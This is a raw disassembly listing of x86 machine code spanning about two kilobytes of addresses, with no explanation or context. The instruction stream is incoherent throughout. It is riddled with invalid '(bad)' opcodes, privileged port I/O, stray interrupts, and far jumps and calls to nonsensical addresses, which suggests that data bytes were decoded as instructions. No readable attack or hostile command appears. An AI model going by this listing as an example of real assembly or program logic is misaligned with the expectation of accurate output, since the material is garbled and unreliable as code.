  40db14:	popf   
  40db15:	lahf   
  40db16:	out    dx,al
  40db17:	lods   eax,DWORD PTR ds:[esi]
  40db18:	rcl    DWORD PTR [ebp+0x21013d16],cl
  40db1e:	pop    edi
  40db1f:	jne    0x40db19
  40db21:	or     DWORD PTR [edi+eax*1-0x32],edi
  40db25:	xor    BYTE PTR [ebp-0x16],bh
  40db28:	pushf  
  40db29:	loop   0x40db72
  40db2b:	es or  al,0xac
  40db2e:	push   ss
  40db2f:	push   cs
  40db30:	rol    DWORD PTR [eax],1
  40db32:	sub    BYTE PTR [ecx],dl
  40db34:	sti    
  40db35:	rcl    bh,1
  40db37:	xchg   esi,eax
  40db38:	xor    ebx,eax
  40db3a:	popf   
  40db3b:	dec    ebp
  40db3c:	xlat   BYTE PTR ds:[ebx]
  40db3d:	adc    BYTE PTR [ebx+esi*1],ah
  40db40:	mov    ebx,0x24257e13
  40db45:	repz sar DWORD PTR [edx+ecx*4],1
  40db49:	fadd   DWORD PTR [esi+ebp*8+0x22]
  40db4d:	test   DWORD PTR ds:0x3994274d,0xee481ef
  40db57:	xchg   edi,eax
  40db58:	out    dx,eax
  40db59:	lods   eax,DWORD PTR ds:[esi]
  40db5a:	xor    DWORD PTR [edi-0x4c70b273],esi
  40db60:	or     ah,BYTE PTR [eax+edi*8-0x6dd2b92e]
  40db67:	dec    esp
  40db68:	nop
  40db69:	bound  edx,QWORD PTR [edx-0x51]
  40db6c:	jl     0x40db66
  40db6e:	jae    0x40daf4
  40db70:	sbb    eax,0x450f6bb4
  40db75:	and    BYTE PTR [edx+0x38],cl
  40db78:	xor    al,0x3d
  40db7a:	add    eax,DWORD PTR [esi]
  40db7c:	inc    ebx
  40db7d:	mov    bl,0x30
  40db7f:	add    DWORD PTR [edx+0x6ad45d65],edi
  40db85:	ja     0x40dbf4
  40db87:	popf   
  40db88:	jb     0x40dbcc
  40db8a:	mov    edx,0xf1d5cef7
  40db8f:	dec    ebx
  40db90:	push   ss
  40db91:	add    BYTE PTR [ebp+esi*1-0x22a6d407],dl
  40db98:	sbb    DWORD PTR [eax-0x51],esi
  40db9b:	xor    ebx,ecx
  40db9d:	jmp    0x478b40ea
  40dba2:	aaa    
  40dba3:	mov    esp,0x6a3f70fe
  40dba8:	out    dx,eax
  40dba9:	and    al,0x18
  40dbab:	aam    0xac
  40dbad:	addr16 lahf 
  40dbaf:	lea    ebx,[edi]
  40dbb1:	pop    es
  40dbb2:	repz imul ecx,DWORD PTR [edi-0x75],0x3973f9a0
  40dbba:	outs   dx,BYTE PTR ds:[esi]
  40dbbb:	dec    esi
  40dbbc:	sbb    DWORD PTR [ecx-0x8],edx
  40dbbf:	scas   al,BYTE PTR es:[edi]
  40dbc0:	or     edi,DWORD PTR [ebp-0x49089f3]
  40dbc6:	jg     0x40db70
  40dbc8:	outs   dx,DWORD PTR ds:[esi]
  40dbc9:	jne    0x40db8a
  40dbcb:	sub    bh,ah
  40dbcd:	adc    eax,0x4320af87
  40dbd2:	sbb    eax,0x1b999fb9
  40dbd7:	add    al,0x65
  40dbd9:	pop    ecx
  40dbda:	xor    cl,BYTE PTR [eax-0x786072d1]
  40dbe0:	sbb    al,0xc7
  40dbe2:	pop    esp
  40dbe3:	test   DWORD PTR [edi+esi*2-0x25aae055],edx
  40dbea:	(bad)  
  40dbeb:	ins    DWORD PTR es:[edi],dx
  40dbec:	out    0xb9,al
  40dbee:	pop    ecx
  40dbef:	mov    ebp,DWORD PTR [edi+eiz*4-0x1f88f436]
  40dbf6:	bswap  ebp
  40dbf8:	mov    ebp,0xee35d32b
  40dbfd:	loopne 0x40dbfd
  40dbff:	adc    al,0xf7
  40dc01:	mov    ecx,DWORD PTR ds:[eax]
  40dc04:	xor    DWORD PTR [eax-0x53],ecx
  40dc07:	in     eax,dx
  40dc08:	mov    esi,0x89d9b011
  40dc0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dc0e:	xchg   BYTE PTR [ebp-0x1f],al
  40dc11:	inc    ebp
  40dc12:	add    edi,DWORD PTR [ecx+0x1096b800]
  40dc18:	mov    eax,ds:0x8112b87f
  40dc1d:	icebp  
  40dc1e:	xor    BYTE PTR [eax-0x5f],dl
  40dc21:	push   ebx
  40dc22:	scas   al,BYTE PTR es:[edi]
  40dc23:	mov    ecx,0xe36e601
  40dc28:	jp     0x40dc61
  40dc2a:	test   eax,0x4aaf938d
  40dc2f:	int    0x72
  40dc31:	nop
  40dc32:	push   ebp
  40dc33:	mov    WORD PTR [edx-0x3c80ee90],cs
  40dc39:	adc    ch,BYTE PTR [ebx+0x2f4b98df]
  40dc3f:	add    eax,0x4bb22ba6
  40dc44:	adc    BYTE PTR ds:0xd48c2382,dh
  40dc4a:	les    ebp,FWORD PTR [edi-0x6a5780b5]
  40dc50:	(bad)  
  40dc51:	fistp  WORD PTR fs:[edx+0x16a406c6]
  40dc58:	scas   al,BYTE PTR es:[edi]
  40dc59:	or     DWORD PTR [edx-0x6],0x1579e5c3
  40dc60:	mov    esi,0x86c96f2
  40dc65:	pop    ds
  40dc66:	jmp    0xe324:0xe4e9194e
  40dc6d:	clc    
  40dc6e:	mov    dh,0x7c
  40dc70:	dec    edx
  40dc71:	pop    esi
  40dc72:	jno    0x40dc9f
  40dc74:	and    al,0xac
  40dc76:	dec    edx
  40dc77:	add    bl,dh
  40dc79:	inc    eax
  40dc7a:	inc    BYTE PTR [esi-0x7d93a75d]
  40dc80:	aas    
  40dc81:	fist   WORD PTR [ecx+0x2520f581]
  40dc87:	and    esi,eax
  40dc89:	aad    0xda
  40dc8b:	xor    dl,BYTE PTR [edi-0x4322b841]
  40dc91:	mov    BYTE PTR es:[edx],ch
  40dc94:	out    0x55,al
  40dc96:	dec    esi
  40dc97:	std    
  40dc98:	shl    DWORD PTR [ebx+0x1a],1
  40dc9b:	int3   
  40dc9c:	xchg   DWORD PTR [ebp-0x33],ecx
  40dc9f:	xchg   edi,eax
  40dca0:	fidiv  WORD PTR [ecx+0x15]
  40dca3:	out    0xc,eax
  40dca5:	jmp    0x40dc2b
  40dca7:	sub    DWORD PTR ds:0x49b0c530,esp
  40dcad:	scas   al,BYTE PTR es:[edi]
  40dcae:	jnp    0x40dd21
  40dcb0:	push   ss
  40dcb1:	inc    edi
  40dcb2:	mov    ebx,0xc513eb85
  40dcb7:	scas   al,BYTE PTR es:[edi]
  40dcb8:	cmp    BYTE PTR [ecx-0x1ae7c5d8],0x2d
  40dcbf:	popf   
  40dcc0:	shl    BYTE PTR [ebx+0x464080e4],0x66
  40dcc7:	pop    esi
  40dcc8:	scas   al,BYTE PTR es:[edi]
  40dcc9:	out    0x8e,al
  40dccb:	shl    DWORD PTR [eax-0x441d3892],1
  40dcd1:	test   DWORD PTR [ecx+0x28],esp
  40dcd4:	retf   0x5af9
  40dcd7:	inc    esp
  40dcd8:	dec    edx
  40dcd9:	imul   esp,DWORD PTR [esp+ebx*4+0x22],0xfb983b23
  40dce1:	push   ss
  40dce2:	add    BYTE PTR [edx+0x3d921a7d],bl
  40dce8:	(bad)  
  40dce9:	jmp    0x40dd1a
  40dceb:	dec    edx
  40dcec:	pop    esi
  40dced:	rcr    ah,1
  40dcef:	mov    dl,0x78
  40dcf1:	sub    ah,BYTE PTR [eax]
  40dcf3:	fs mov dh,0xc4
  40dcf6:	lock ds leave 
  40dcf9:	and    eax,ebx
  40dcfb:	adc    ah,ah
  40dcfd:	(bad)  
  40dcfe:	ror    DWORD PTR [edx+0x4427a705],0x86
  40dd05:	repz xchg ecx,eax
  40dd07:	or     BYTE PTR [esi-0x42490cfa],bh
  40dd0d:	inc    edx
  40dd0e:	jae    0x40dcab
  40dd10:	sbb    eax,0xcf7b6270
  40dd15:	fucomi st,st(3)
  40dd17:	cmp    eax,0x7fee895a
  40dd1c:	and    eax,0x871d0197
  40dd21:	scas   eax,DWORD PTR es:[edi]
  40dd22:	jg     0x40dce7
  40dd24:	sub    dl,BYTE PTR [ebx-0x25b64fa0]
  40dd2a:	ja     0x40dcf7
  40dd2c:	stc    
  40dd2d:	aas    
  40dd2e:	icebp  
  40dd2f:	xchg   esi,eax
  40dd30:	hlt    
  40dd31:	lods   eax,DWORD PTR ds:[esi]
  40dd32:	mov    al,0xf9
  40dd34:	call   0x86d:0xf563fff5
  40dd3b:	test   BYTE PTR [edx+ecx*8-0x51],0x61
  40dd40:	mov    bh,0x93
  40dd42:	imul   ebp,DWORD PTR [edi-0x5f],0x7ba5e68
  40dd49:	in     eax,dx
  40dd4a:	adc    bh,BYTE PTR [ebp+0x43]
  40dd4d:	jg     0x40dd0c
  40dd4f:	adc    DWORD PTR [eax],0xffffffd1
  40dd52:	cmc    
  40dd53:	mov    dl,bl
  40dd55:	ins    DWORD PTR es:[edi],dx
  40dd56:	div    dh
  40dd58:	jnp    0x40dd91
  40dd5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40dd5b:	mov    ecx,0x2d8234ca
  40dd60:	mov    edx,DWORD PTR [ebx+0xe]
  40dd63:	push   esi
  40dd64:	and    BYTE PTR [ecx],bl
  40dd66:	sub    ebx,DWORD PTR [edi+0x4c230a08]
  40dd6c:	push   esp
  40dd6d:	push   0xdbf13930
  40dd72:	fldenv [eax+0x5d]
  40dd75:	rol    esi,1
  40dd77:	xor    eax,0x5577e9a6
  40dd7c:	pop    eax
  40dd7d:	sbb    DWORD PTR [ebp+0x6f06275],edi
  40dd83:	inc    esi
  40dd84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dd85:	call   0x9bccc9c3
  40dd8a:	ins    DWORD PTR es:[edi],dx
  40dd8b:	pop    ebp
  40dd8c:	stos   BYTE PTR es:[edi],al
  40dd8d:	push   ebx
  40dd8e:	pop    edx
  40dd8f:	es inc ebx
  40dd91:	in     al,0x6c
  40dd93:	cwde   
  40dd94:	and    BYTE PTR [eax-0x1a],0xea
  40dd98:	fs (bad) 
  40dd9a:	cli    
  40dd9b:	sbb    al,0xc7
  40dd9d:	pop    ebp
  40dd9e:	lahf   
  40dd9f:	nop
  40dda0:	add    cl,cl
  40dda2:	adc    al,cl
  40dda4:	inc    edx
  40dda5:	xchg   edi,eax
  40dda6:	push   0xffffff8b
  40dda8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dda9:	cmc    
  40ddaa:	lahf   
  40ddab:	es push ss
  40ddad:	or     al,0x9
  40ddaf:	add    dl,BYTE PTR [edx]
  40ddb1:	enter  0xd2c6,0xd9
  40ddb5:	ret    
  40ddb6:	inc    edx
  40ddb7:	xor    DWORD PTR [edx-0x58857b5e],esi
  40ddbd:	test   DWORD PTR [edi+0x62f09b89],0x286890f9
  40ddc7:	repz push ss
  40ddc9:	clc    
  40ddca:	and    BYTE PTR [edx-0x5b4a48f5],ch
  40ddd0:	add    edx,edx
  40ddd2:	int    0x78
  40ddd4:	adc    ebp,DWORD PTR [esp+ebp*4+0x3ddbcdbc]
  40dddb:	loop   0x40ddcb
  40dddd:	or     ah,BYTE PTR [ecx+0x2c]
  40dde0:	and    eax,0xd17bffa8
  40dde5:	jecxz  0x40dd72
  40dde7:	cdq    
  40dde8:	push   ds
  40dde9:	and    eax,0x4d1e3be5
  40ddee:	jl     0x40ddc5
  40ddf0:	mov    cl,0xe8
  40ddf2:	mov    edi,0x530d174c
  40ddf7:	sbb    cl,BYTE PTR [ebp+esi*4-0x4a3f2320]
  40ddfe:	push   eax
  40ddff:	or     ah,dl
  40de01:	sbb    eax,DWORD PTR [ebp-0x78]
  40de04:	fs pop ebx
  40de06:	sub    cl,dl
  40de08:	xchg   BYTE PTR [ecx-0x56187bbd],ch
  40de0e:	int3   
  40de0f:	adc    eax,0xd5f460a8
  40de14:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40de15:	xchg   edx,eax
  40de16:	inc    edx
  40de17:	dec    ecx
  40de18:	sbb    edx,esi
  40de1a:	mov    cs,edi
  40de1c:	inc    ebx
  40de1d:	out    0xe5,al
  40de1f:	and    DWORD PTR [edx+0x62d51225],edx
  40de25:	xchg   si,ax
  40de27:	add    al,0x12
  40de29:	add    BYTE PTR [ecx+0x2b],bl
  40de2c:	fsubrp st(0),st
  40de2e:	push   ss
  40de2f:	(bad)  
  40de30:	cmc    
  40de31:	retf   0xb392
  40de34:	jns    0x40de45
  40de36:	mov    dh,0x34
  40de38:	pop    es
  40de39:	mov    edi,0x4a9f6559
  40de3e:	push   ecx
  40de3f:	pop    ebp
  40de40:	ret    0xc2f6
  40de43:	retf   0xf25b
  40de46:	mov    cl,0x6e
  40de48:	jnp    0x40de83
  40de4a:	fs mov ebp,0xcbd0c4e4
  40de50:	dec    esp
  40de51:	test   BYTE PTR [esi+0x46],bh
  40de54:	mov    ds:0xa06b4f5d,eax
  40de59:	inc    edi
  40de5a:	pop    esi
  40de5b:	(bad)  
  40de5c:	adc    BYTE PTR [edx-0x33],bh
  40de5f:	cmp    BYTE PTR [edx-0xb],cl
  40de62:	mov    ds:0x49a20dd6,al
  40de67:	or     al,0x8e
  40de69:	inc    edx
  40de6a:	cli    
  40de6b:	pop    ds
  40de6c:	(bad)  
  40de6e:	retf   
  40de6f:	mov    ecx,0x58e26896
  40de74:	sub    DWORD PTR [ecx+0x2b50fc3c],0xffffffa3
  40de7b:	xor    al,0x82
  40de7d:	xchg   ecx,eax
  40de7e:	cmp    eax,eax
  40de80:	mov    ah,0x1e
  40de82:	imul   ecx,ebx,0x2
  40de85:	int3   
  40de86:	mov    al,ds:0x9fb391b
  40de8b:	std    
  40de8c:	mov    cl,0xca
  40de8e:	repnz mov al,0x24
  40de91:	mov    eax,ds:0x7b54cc8c
  40de96:	inc    ebp
  40de97:	push   edx
  40de98:	mov    ebx,0xa70684fa
  40de9d:	rcr    al,1
  40de9f:	ret    0x5572
  40dea2:	xchg   ebp,eax
  40dea3:	aaa    
  40dea4:	inc    al
  40dea6:	sbb    ah,BYTE PTR [edi-0x170e302d]
  40deac:	mov    ebx,0xe17344eb
  40deb1:	push   edi
  40deb2:	and    BYTE PTR [ecx],cl
  40deb4:	mov    bh,0xe4
  40deb6:	pop    esp
  40deb7:	daa    
  40deb8:	ror    DWORD PTR [eax+edi*1-0x6172bd36],1
  40debf:	mov    ds:0x722ed74b,al
  40dec4:	lahf   
  40dec5:	enter  0x6825,0xd1
  40dec9:	xor    eax,0x7993a405
  40dece:	nop
  40decf:	pop    es
  40ded0:	sti    
  40ded1:	adc    BYTE PTR [ebp-0x5f],ah
  40ded4:	pop    ds
  40ded5:	data16 repz ja 0x40de5d
  40ded9:	mov    dl,bh
  40dedb:	stos   DWORD PTR es:[edi],eax
  40dedc:	adc    eax,0xbfd3f779
  40dee1:	in     eax,0xf0
  40dee3:	(bad)  
  40dee4:	sub    eax,DWORD PTR [si]
  40dee7:	mov    ds:0xbd20f377,al
  40deec:	inc    ebp
  40deed:	stos   BYTE PTR es:[edi],al
  40deee:	cmp    BYTE PTR [eax+0x4ae46fa2],0xe5
  40def5:	and    BYTE PTR [edi],ah
  40def7:	sbb    ebp,DWORD PTR [esi+ecx*8]
  40defa:	add    ecx,DWORD PTR ds:0xc265165e
  40df00:	and    BYTE PTR [edi],0xf8
  40df03:	push   es
  40df04:	adc    al,0x81
  40df06:	or     al,0x9c
  40df08:	imul   ebp,ebx,0xb3f3f1b6
  40df0e:	or     esp,DWORD PTR [ecx-0x5b]
  40df11:	bndldx bnd0,[eax+0x790814ec]
  40df18:	call   0x4be3:0x1f9ab7c6
  40df1f:	jne    0x40decc
  40df21:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40df22:	jo     0x40df9d
  40df24:	(bad)  
  40df25:	clc    
  40df26:	(bad)  
  40df27:	rol    BYTE PTR [edx+eiz*4],0x4
  40df2b:	icebp  
  40df2c:	push   0x53
  40df2e:	bound  esp,QWORD PTR [ebx+0x556d2f7e]
  40df34:	xchg   DWORD PTR [ebp+eiz*8-0x20500587],ebp
  40df3b:	jno    0x40df33
  40df3d:	dec    edx
  40df3e:	jmp    0x40ded2
  40df40:	lds    eax,FWORD PTR [esi-0x23]
  40df43:	fcomp  DWORD PTR [edx]
  40df45:	(bad)  
  40df47:	dec    edi
  40df48:	sub    DWORD PTR [ecx+0x78],0xa73467fd
  40df4f:	fst    DWORD PTR [edx]
  40df51:	sbb    ecx,DWORD PTR [edx-0x71]
  40df54:	ror    DWORD PTR ds:0xc9a77b03,1
  40df5a:	adc    eax,DWORD PTR [edi+0xe]
  40df5d:	xor    bh,BYTE PTR [eax-0x3197fd99]
  40df63:	(bad)  
  40df64:	adc    BYTE PTR [esi-0xc58e4a7],ch
  40df6a:	aad    0xa8
  40df6c:	cmp    edi,DWORD PTR [edx+0x6385e312]
  40df72:	(bad)  
  40df73:	aas    
  40df74:	gs int 0x4
  40df77:	fmul   QWORD PTR [esi]
  40df79:	loope  0x40df55
  40df7b:	loop   0x40dfe3
  40df7d:	in     eax,0xc8
  40df7f:	aad    0x5e
  40df81:	(bad)  
  40df82:	loopne 0x40df98
  40df84:	jecxz  0x40dff2
  40df86:	adc    bh,BYTE PTR [edx+ebp*4-0x3b0fb868]
  40df8d:	fcmovnb st,st(0)
  40df8f:	dec    ebp
  40df90:	cmp    al,0xb7
  40df92:	sub    ecx,ebx
  40df94:	xchg   eax,edx
  40df96:	sub    DWORD PTR [esi+0x6f],ebx
  40df99:	mov    edx,0x42d80f63
  40df9e:	or     BYTE PTR [edi+ebp*8-0xc6cfb4b],dh
  40dfa5:	ret    0x774b
  40dfa8:	push   edi
  40dfa9:	retf   
  40dfaa:	js     0x40df89
  40dfac:	xor    BYTE PTR [edx+eax*1],cl
  40dfaf:	and    eax,0x8138d1f1
  40dfb4:	xor    DWORD PTR [eax+0xffc0b2c],esp
  40dfba:	(bad)  
  40dfbb:	leave  
  40dfbc:	popa   
  40dfbd:	and    ah,BYTE PTR [esi+0xe]
  40dfc0:	or     al,0x7c
  40dfc2:	dec    eax
  40dfc3:	mov    BYTE PTR [edi],0xa2
  40dfc6:	(bad)  
  40dfc8:	ror    BYTE PTR [ebx+0x22],1
  40dfcb:	scas   eax,DWORD PTR es:[edi]
  40dfcc:	inc    edx
  40dfcd:	sar    DWORD PTR [ecx+eiz*1+0x50c37fd0],cl
  40dfd4:	imul   ebp,eax,0x7356368c
  40dfda:	sbb    eax,0xe530f907
  40dfdf:	inc    eax
  40dfe0:	sbb    esp,DWORD PTR [ebp-0x2]
  40dfe3:	add    esi,eax
  40dfe5:	xchg   edx,eax
  40dfe6:	ins    DWORD PTR es:[edi],dx
  40dfe7:	and    al,0xcd
  40dfe9:	push   cs
  40dfea:	mov    eax,0xaf4c7ee8
  40dfef:	sub    eax,0x945277ec
  40dff4:	nop
  40dff5:	lahf   
  40dff6:	pop    ebx
  40dff7:	clc    
  40dff8:	add    ebx,DWORD PTR [ecx+ebx*1+0x7a]
  40dffc:	jns    0x40e051
  40dffe:	push   0x40
  40e000:	aam    0xad
  40e002:	and    ebx,ecx
  40e004:	mov    edx,0xc8b3c8ae
  40e009:	push   edi
  40e00a:	in     al,dx
  40e00b:	push   ebp
  40e00c:	neg    BYTE PTR [eax]
  40e00e:	les    esi,FWORD PTR [edi+ecx*4]
  40e011:	sbb    DWORD PTR [edx+0x1ddeaf09],ebx
  40e017:	addr16 in al,dx
  40e019:	stos   DWORD PTR es:[edi],eax
  40e01a:	and    BYTE PTR [edi],0x98
  40e01d:	xchg   ecx,eax
  40e01e:	call   FWORD PTR ds:0xad5b3d2c
  40e024:	ja     0x40e00a
  40e026:	mov    fs,eax
  40e028:	and    DWORD PTR [ebx-0x1d],0x14
  40e02c:	adc    DWORD PTR [edi],ebx
  40e02e:	and    DWORD PTR [eax-0x5e33535f],0x11
  40e035:	fcmovb st,st(0)
  40e037:	outs   dx,DWORD PTR ds:[esi]
  40e038:	ja     0x40e0b1
  40e03a:	fiadd  WORD PTR [edi-0x77]
  40e03d:	push   ecx
  40e03e:	inc    esp
  40e03f:	push   0x584c8985
  40e044:	je     0x40e0b0
  40e046:	pop    esp
  40e047:	test   eax,0xe1173157
  40e04c:	mov    ds,esp
  40e04e:	rol    DWORD PTR [ecx-0x3ba4147d],0x7b
  40e055:	fcomip st,st(2)
  40e057:	(bad)  
  40e058:	and    eax,0x8d0af154
  40e05d:	outs   dx,DWORD PTR ds:[esi]
  40e05e:	xchg   ebx,eax
  40e05f:	push   ds
  40e060:	fidivr DWORD PTR [edx+0x12d83273]
  40e066:	repnz or DWORD PTR [esp+esi*8+0x25],0x804b4770
  40e06f:	add    BYTE PTR [edx],cl
  40e071:	mov    dh,0x7d
  40e073:	cmp    edi,edx
  40e075:	dec    eax
  40e076:	ss mov al,0xf1
  40e079:	xchg   ebx,eax
  40e07a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e07b:	arpl   WORD PTR [esi],cx
  40e07d:	addr16 mov esi,ds
  40e080:	lods   al,BYTE PTR ds:[esi]
  40e081:	inc    edx
  40e082:	in     eax,dx
  40e083:	into   
  40e084:	int3   
  40e085:	fsubrp st(3),st
  40e087:	mov    eax,ds:0x48b094d0
  40e08c:	mov    ebx,edi
  40e08e:	mov    eax,ds:0x19e3432c
  40e093:	cld    
  40e094:	adc    eax,0xd4217579
  40e099:	push   edx
  40e09a:	and    al,0xff
  40e09c:	int3   
  40e09d:	mov    ch,BYTE PTR [esi]
  40e09f:	cdq    
  40e0a0:	dec    edi
  40e0a1:	lds    ebx,FWORD PTR [ebx+0x4c]
  40e0a4:	stos   BYTE PTR es:[edi],al
  40e0a5:	xchg   BYTE PTR fs:[eax+0x51da7bdb],dh
  40e0ac:	dec    ebx
  40e0ad:	sahf   
  40e0ae:	cs add bl,0xa2
  40e0b2:	int    0x5
  40e0b4:	cmp    BYTE PTR [ecx-0x3d233aa8],dh
  40e0ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e0bb:	xor    cl,BYTE PTR [ebx-0x2852d164]
  40e0c1:	inc    esp
  40e0c2:	int    0x8d
  40e0c4:	or     ebx,DWORD PTR [edi]
  40e0c6:	sti    
  40e0c7:	leave  
  40e0c8:	sub    eax,0xb48e2d99
  40e0cd:	jnp    0x40e114
  40e0cf:	dec    esi
  40e0d0:	mov    esi,0xd4d18584
  40e0d5:	sbb    al,BYTE PTR [edx-0x5af9b5fa]
  40e0db:	push   ds
  40e0dc:	mov    dl,0x2a
  40e0de:	(bad)  
  40e0df:	shl    DWORD PTR [ebp-0x23],0xac
  40e0e3:	inc    esi
  40e0e4:	and    DWORD PTR [ecx-0x79bfd9d0],edi
  40e0ea:	stos   DWORD PTR es:[edi],eax
  40e0eb:	(bad)  
  40e0ec:	mov    dl,0x2
  40e0ee:	std    
  40e0ef:	cmc    
  40e0f0:	pop    ebx
  40e0f1:	ja     0x40e08a
  40e0f3:	scas   al,BYTE PTR es:[edi]
  40e0f4:	retf   0x1d93
  40e0f7:	mov    ds:0x72407de5,al
  40e0fc:	nop
  40e0fd:	ss push esi
  40e0ff:	je     0x40e094
  40e101:	xchg   esp,eax
  40e102:	inc    eax
  40e103:	ror    edi,1
  40e105:	jmp    0x40e11d
  40e107:	shl    DWORD PTR [esi-0x4318a9],cl
  40e10d:	dec    esi
  40e10e:	std    
  40e10f:	mov    al,ds:0xd53a1fae
  40e114:	into   
  40e115:	rep ins BYTE PTR es:[edi],dx
  40e117:	stos   BYTE PTR es:[edi],al
  40e118:	mov    ?,WORD PTR [esi+edi*1-0x14]
  40e11c:	leave  
  40e11d:	cmp    al,0xef
  40e11f:	(bad)  
  40e120:	std    
  40e121:	sar    BYTE PTR [ebp-0x2f],cl
  40e124:	leave  
  40e125:	xor    BYTE PTR ds:0x70011567,dl
  40e12b:	andps  xmm6,xmm0
  40e12e:	adc    dl,BYTE PTR [esi+0x50]
  40e131:	ja     0x40e0fa
  40e133:	push   ss
  40e134:	in     al,0xb5
  40e136:	mov    ds:0x408c89d1,al
  40e13b:	or     al,0xf2
  40e13d:	jecxz  0x40e127
  40e13f:	ja     0x40e18b
  40e141:	scas   al,BYTE PTR es:[edi]
  40e142:	stc    
  40e143:	jbe    0x40e1aa
  40e145:	add    dh,al
  40e147:	(bad)  
  40e148:	test   eax,0xb8e6ef52
  40e14d:	push   ds
  40e14e:	mov    eax,0x255f8a44
  40e153:	repz push edi
  40e155:	outs   dx,BYTE PTR ds:[esi]
  40e156:	jmp    0xee8:0xad1423f6
  40e15d:	lock lods al,BYTE PTR ds:[esi]
  40e15f:	ud0    ebp,DWORD PTR [eax]
  40e162:	xlat   BYTE PTR ds:[ebx]
  40e163:	test   BYTE PTR [ebp+eiz*1+0x69],dl
  40e167:	mov    BYTE PTR [ebx],cl
  40e169:	sub    cl,bh
  40e16b:	xor    DWORD PTR [ebp+0x198fa029],ebp
  40e171:	lds    ecx,FWORD PTR [ebx+0x14]
  40e174:	rcl    DWORD PTR [esi-0x4af8f3e3],0xdd
  40e17b:	imul   edx,DWORD PTR [esi],0xfffffff4
  40e17e:	or     ah,BYTE PTR [edi-0x28]
  40e181:	mov    ah,0x31
  40e183:	retf   
  40e184:	outs   dx,DWORD PTR ds:[esi]
  40e185:	fnstsw WORD PTR [esi]
  40e187:	fwait
  40e188:	or     ch,bl
  40e18a:	cmp    dh,bh
  40e18c:	jbe    0x40e1d7
  40e18e:	mov    dl,0x49
  40e190:	fsubr  DWORD PTR [ebp+0x9]
  40e193:	mov    dh,ah
  40e195:	enter  0x5a34,0xb4
  40e199:	lods   eax,DWORD PTR ds:[esi]
  40e19a:	xor    al,bl
  40e19c:	mov    eax,fs:0x32964dd7
  40e1a2:	fist   WORD PTR [ecx]
  40e1a4:	scas   al,BYTE PTR es:[edi]
  40e1a5:	dec    ecx
  40e1a6:	hlt    
  40e1a7:	arpl   WORD PTR [ecx-0x4713634f],dx
  40e1ad:	xor    eax,0x84ca892b
  40e1b2:	add    BYTE PTR [edi-0x5def85ec],al
  40e1b8:	inc    esp
  40e1b9:	clc    
  40e1ba:	jp     0x40e1eb
  40e1bc:	mov    esi,0xa0d4fe56
  40e1c1:	cdq    
  40e1c2:	clc    
  40e1c3:	xor    BYTE PTR [edi-0x4b],0x69
  40e1c7:	xchg   esp,eax
  40e1c8:	pushf  
  40e1c9:	(bad)  
  40e1ca:	repnz sub DWORD PTR [edx+0x6ef11110],esi
  40e1d1:	repnz xor DWORD PTR [ecx+0x262c392d],ecx
  40e1d8:	retf   0xabd3
  40e1db:	es (bad) 
  40e1de:	mov    cs,WORD PTR [ecx+0x38c4db4c]
  40e1e4:	and    DWORD PTR [esi+0x70],ebp
  40e1e7:	xor    al,0xe
  40e1e9:	test   DWORD PTR [eax-0x32cc5a91],0xaa57416e
  40e1f3:	mov    bh,0x7e
  40e1f5:	mov    dl,0x34
  40e1f7:	bound  esp,QWORD PTR [edi]
  40e1f9:	jo     0x9225f0a2
  40e1ff:	sbb    bh,BYTE PTR [edx-0x6cecb2f2]
  40e205:	sub    DWORD PTR [eax-0x62],0x62
  40e209:	pop    edi
  40e20a:	dec    eax
  40e20b:	clc    
  40e20c:	fidivr DWORD PTR [ebx-0x71948119]
  40e212:	or     BYTE PTR [edx+eax*1+0x36],0xe7
  40e217:	add    ebp,DWORD PTR [ecx]
  40e219:	outs   dx,BYTE PTR ds:[esi]
  40e21a:	cmp    DWORD PTR [ecx+edx*1-0x2b],edx
  40e21e:	mov    bl,0x58
  40e220:	push   ecx
  40e221:	jno    0x40e21f
  40e223:	xchg   esi,eax
  40e224:	pusha  
  40e225:	push   0xb7eec918
  40e22a:	call   0x49bb:0x93ad075a
  40e231:	jmp    0xcb52ef12
  40e236:	(bad)  
  40e237:	jmp    0x40e1fb
  40e239:	in     al,0x65
  40e23b:	fmul   QWORD PTR gs:[esi+0x28e571b9]
  40e242:	xor    DWORD PTR [ebx],ebx
  40e244:	pop    es
  40e245:	loope  0x40e215
  40e247:	adc    DWORD PTR [ebx-0x481201ab],0x61d31350
  40e251:	jmp    0x40e1dd
  40e253:	mov    ebp,0xf2e4934d
  40e258:	mov    ebp,eax
  40e25a:	in     eax,0x54
  40e25c:	stos   DWORD PTR es:[edi],eax
  40e25d:	js     0x40e200
  40e25f:	jb     0x40e1fc
  40e261:	arpl   WORD PTR [esi+0x28d40bb1],dx
  40e267:	adc    BYTE PTR [ebx],dl
  40e269:	jecxz  0x40e281
  40e26b:	call   0x1560:0xe08fcaf8
  40e272:	fcom   QWORD PTR [edi+ebx*1-0x2c]
  40e277:	sar    DWORD PTR [eax],1
  40e279:	push   0x75b8ee4b
  40e27e:	gs push eax
  40e280:	loopne 0x40e280
  40e282:	dec    edi
  40e283:	sub    esi,DWORD PTR [ecx+0x597023b4]
  40e289:	repnz mov ecx,0x4eea45d1
  40e28f:	cli    
  40e290:	jns    0x40e299
  40e292:	loop   0x40e281
  40e294:	ss (bad) 
  40e296:	cld    
  40e297:	(bad)  
  40e298:	push   edx
  40e299:	iret   
  40e29a:	fdiv   QWORD PTR [esi-0x77]
  40e29d:	std    
  40e29e:	and    dl,BYTE PTR [esp+edi*2]
  40e2a1:	or     BYTE PTR [ebx-0x79edb347],0x5e
  40e2a8:	xchg   DWORD PTR [eax],ebx
  40e2aa:	push   0xffffffec
  40e2ac:	pop    esp
  40e2ad:	xor    eax,0x739be6ed
  40e2b2:	rol    DWORD PTR [eax-0xa],0x1d
  40e2b6:	mov    al,0xa0
  40e2b8:	loopne 0x40e2d9
  40e2ba:	sbb    eax,0xe600e8e2
  40e2bf:	in     eax,0x5e
  40e2c1:	fsubr  st,st(1)
  40e2c3:	dec    ebp
  40e2c4:	popf   
  40e2c5:	cwde   
  40e2c6:	ss and eax,0xf74b2126
  40e2cc:	jle    0x40e343
  40e2ce:	adc    ecx,0xffffffba
